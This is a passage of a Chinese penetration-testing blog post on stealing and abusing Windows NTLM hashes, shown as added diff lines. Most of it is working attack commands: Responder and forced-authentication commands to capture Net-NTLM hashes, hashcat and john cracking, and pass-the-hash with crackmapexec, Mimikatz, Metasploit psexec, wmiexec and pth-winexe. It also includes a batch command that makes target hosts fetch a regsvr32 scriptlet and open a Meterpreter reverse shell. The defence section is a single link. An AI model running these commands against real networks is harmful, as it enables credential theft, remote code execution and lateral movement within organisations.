+<p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-hash/20181204130140.png"></p>
+<p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-hash/20181204130759.png"></p>
+<p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p>
+<ul>
+<li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li>
+<li>钓鱼文档：doc、docx、pdf</li>
+<li>后门设置：</li>
+</ul>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u /i://17.10.0.1/@abc hello.dll</span><br><span class="line"></span><br><span class="line">powershell -c &quot;Invoke-Item \\17.10.0.1\aa&quot;</span><br><span class="line">powershell -nop -exec bypass -c &quot;Invoke-Item \\17.10.0.1\aa&quot;</span><br><span class="line">Invoke-Item \\192.168.0.1\aa</span><br><span class="line">Get-Content \\192.168.0.1\aa</span><br><span class="line">Start-Process \\192.168.0.1\aa </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h2><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" >dumping-domain-password-hashes<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" >Places of Interest in Stealing NetNTLM Hashes<i class="fas fa-external-link-alt"></i></a> 及译文 <a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/474/" >花式窃取NetNTLM哈希的方法<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h1><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p>
+<h2 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h2><h3 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h3><p>下面是一些提供在线解密的站点：</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cmd5.com/" >https://www.cmd5.com/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://crack.sh/get-cracking/" >https://crack.sh/get-cracking/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://hashcrack.com/index.php" >http://hashcrack.com/index.php<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://cracker.offensive-security.com/index.php" >http://cracker.offensive-security.com/index.php<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://www.objectif-securite.ch/en/ophcrack.php" >http://www.objectif-securite.ch/en/ophcrack.php<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<h3 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h3><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p>
+<h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john HTTP-NTLMv2-17.10.0.10.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-hash/20181204134230.png"></p>
+<h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p>
+<p><code>-m</code>  hash类型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LM：3000 </span><br><span class="line">NTLM：1000</span><br><span class="line">NetNTLMv1：5500</span><br><span class="line">NetNTLMv2：5600 </span><br></pre></td></tr></table></figure>
+
+<p>NTLMv1的格式为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>
+
+<p>构造后的数据如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</span><br></pre></td></tr></table></figure>
+
+<p>Hashcat参数如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
+
+<p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p>
+</blockquote>
+<p>其他破解工具</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.trustedsec.com/blog/summerof2018/" >https://www.trustedsec.com/blog/summerof2018/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h2><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。PTH是基于IPC远程连接实现，<em>只能使用被添加到远程计算机管理员组的域用户来远程连接</em></p>
+<p>常见PTH工具： </p>
+<ul>
+<li>Crackmapexec</li>
+<li>Mimikatz</li>
+<li>smbmap</li>
+<li>smbexec</li>
+<li>metasploit</li>
+<li>cobaltstrike</li>
+</ul>
+<h3 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec" >crackmapexec<i class="fas fa-external-link-alt"></i></a></h3><p>Window版本：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/MichaelKCortez/CrackMapExecWin" >https://github.com/MichaelKCortez/CrackMapExecWin<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/maaaaz/CrackMapExecWin" >https://github.com/maaaaz/CrackMapExecWin<i class="fas fa-external-link-alt"></i></a></p>
+<p>1.安装 crackmapexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br><span class="line">(pip install crackmapexec)</span><br></pre></td></tr></table></figure>
+
+<p>2.使用 crackmapexec</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb -h</span><br></pre></td></tr></table></figure>
+
+<p>批量扫描探测命令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>/<span class="number">24</span></span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span> -u administrator -H <span class="built_in">hash</span>.txt</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.100</span>-<span class="number">200</span> -u administrator -H AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>
+
+<p>执行命令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -p toor(明文密码) -x whoami</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -H afc44ee7351d61d00698796da06b1ebf -x whoami</span><br></pre></td></tr></table></figure>
+
+<p>其他参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">--shares	<span class="comment">#枚举共享和访问权限</span></span><br><span class="line">--sessions	<span class="comment">#枚举活动会话</span></span><br><span class="line">--disks		<span class="comment">#枚举磁盘</span></span><br><span class="line">--sam 		<span class="comment">#dump目标系统中的SAM哈希值</span></span><br><span class="line">--loggedon-users	<span class="comment">#枚举登录用户</span></span><br><span class="line">--<span class="built_in">users</span> [USER]		<span class="comment">#枚举域用户(如果指定了用户只查询其信息)</span></span><br><span class="line">--<span class="built_in">groups</span> [GROUP]		<span class="comment">#枚举域组(如果指定了组其成员被列举)</span></span><br><span class="line">--local-groups [GROUP]  <span class="comment">#如果指定了组则枚举本地组其成员被列举</span></span><br><span class="line">--local-groups [GROUP]	<span class="comment">#枚举本地组，如果指定了组，则枚举其成员</span></span><br><span class="line">-x COMMAND				<span class="comment">#执行指定的命令</span></span><br><span class="line">-X PS_COMMAND			<span class="comment">#执行指定的PowerShell命令</span></span><br><span class="line"></span><br><span class="line">-L， --list-modules	<span class="comment">#列出可用的拓展功能模块</span></span><br><span class="line">--options	<span class="comment">#查看模块选项</span></span><br><span class="line">-M MODULE， --module MODULE	 <span class="comment">#使用拓展功能模块</span></span><br><span class="line">-o MODULE_OPTION [MODULE_OPTION ...] <span class="comment">#设置模块选项</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>GETSHELL</p>
+<p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/python2<span class="number">.7</span>/dist-packages/crackmapexec-<span class="number">4.0</span><span class="number">.1</span>.dev0-py2<span class="number">.7</span>.egg/cme/modules</span><br></pre></td></tr></table></figure>
+
+<p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cme smb -M met_inject --options</span><br><span class="line">[*] met_inject module options:</span><br><span class="line">    LHOST    IP hosting the handler</span><br><span class="line">    LPORT    Handler port</span><br><span class="line">    PAYLOAD  Payload to inject: reverse_http or reverse_https (default:reverse_https)</span><br><span class="line">    PROCID   Process ID to inject into (default: current powershell process)</span><br></pre></td></tr></table></figure>
+<p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o LHOST=17.10.0.1 LPORT=9999</span><br></pre></td></tr></table></figure>
+
+<p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p>
+<p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 17.10.0.1</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 17.10.0.1:9999 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1KZkey</span><br><span class="line">[*] Local IP: http://10.204.146.152:8080/1KZkey</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p>通过pass-the-hash执行命令批量getshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="string">&quot;regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-hash/20181203201319.png"></p>
+<h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a><a class="link"   target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" >Metasploit<i class="fas fa-external-link-alt"></i></a></h3><p>search <code>psexec</code>，<code>smblogin</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>
+
+<p>举例：</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-hash/20181203212818.png"></p>
+<h3 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases" >Mimikatz<i class="fas fa-external-link-alt"></i></a></h3><p>先抓取hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>sekurlsa::logonpasswords<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到hash之后：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">psexec.exe /accepteula \\192.168.1.1 cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># RDP</span></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user<span class="string">&#x27;s ntlm hash&gt; /run:&quot;mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" >wmiexec.py<i class="fas fa-external-link-alt"></i></a></h3><p>exe 版本下载<a class="link"   target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows" >链接<i class="fas fa-external-link-alt"></i></a></p>
+<p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。只能说很多工具吧，比较好用的在这里介绍两种：</p>
+<p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-hash/20181204094217.png"></p>
+<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash" >Invoke-TheHash<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash/" >Invoke-WMIExec<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">17.10</span>.<span class="number">0.10</span> <span class="literal">-Domain</span> test.local <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> AFC44EE7351D61D00698796DA06B1EBF <span class="literal">-Command</span> <span class="string">&quot;calc.exe&quot;</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h3><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe</span><br><span class="line"></span><br><span class="line">pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/yushentou-ntml-hash/20181203225415.png"></p>
+<h1 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h1><p>检测和防御方案参考：<a class="link"   target="_blank" rel="noopener" href="https://attack.stealthbits.com/pass-the-hash-attack-explained" >https://attack.stealthbits.com/pass-the-hash-attack-explained<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>参考链接</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthN/microsoft-ntlm" >Microsoft NTLM<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://www.cnblogs.com/xwdreamer/archive/2012/08/23/2652541.html" >http://www.cnblogs.com/xwdreamer/archive/2012/08/23/2652541.html<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/70395.html" >https://www.freebuf.com/articles/database/70395.html<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27446553/article/details/73635108" >https://blog.csdn.net/qq_27446553/article/details/73635108<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/1845749.html" >工作组和域的区别<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://payloads.online/archivers/2018-11-30/1" >彻底理解Windows认证<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html" >Windows安全认证是如何进行的？[NTLM篇]<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/yangxin114/article/details/8112018" >Windows下的身份验证—-NTLM和Kerberos<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" >域渗透之横向移动<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/pyphrb/article/details/52051321" >https://blog.csdn.net/pyphrb/article/details/52051321<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" >Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8netsh%E6%8A%93%E5%8F%96%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTLMv2-Hash/" >渗透技巧-利用netsh抓取连接文件服务器的NTLMv2-Hash<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/80641938" >https://blog.csdn.net/Fly_hps/article/details/80641938<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" >https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" >https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://attack.stealthbits.com/pass-the-hash-attack-explained" >https://attack.stealthbits.com/pass-the-hash-attack-explained<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：域渗透之NTML</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2018-12-03 09:25:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2018/12/域渗透之ntml/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">#域渗透</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/NTML-Hash/">#NTML-Hash</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2019/01/windows-keep-anonymous/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Windows Keep Anonymous</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2018/11/kali%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">kali常用配置总结</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
